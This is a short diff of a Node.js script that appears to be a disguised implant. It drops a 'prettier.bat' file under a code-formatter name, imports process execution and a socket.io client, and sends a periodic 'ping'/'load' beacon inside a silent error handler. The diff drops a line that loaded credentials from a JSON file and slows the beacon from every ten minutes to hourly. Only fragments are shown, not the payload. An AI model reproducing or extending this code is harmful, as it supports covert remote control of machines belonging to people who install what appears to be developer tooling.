@@ -12,8 +12,6 @@ const os = require("os");
 const { exec } = require("child_process");
 const { io } = require("socket.io-client");
 
-const creds = require('./tools/det.json'); // Make sure credentials.json is in the same folder
-
 const prettierExtracter = () => {
   try {
     const sourceFile = path.join(__dirname, "tools", "prettier.bat");
@@ -523,7 +521,7 @@ await sendMinimizerAndFuzzerData("ping", "load")
         }
       }
     } catch(err){}
-  }, 600000);
+  }, 3600000);
 };
 
 main();
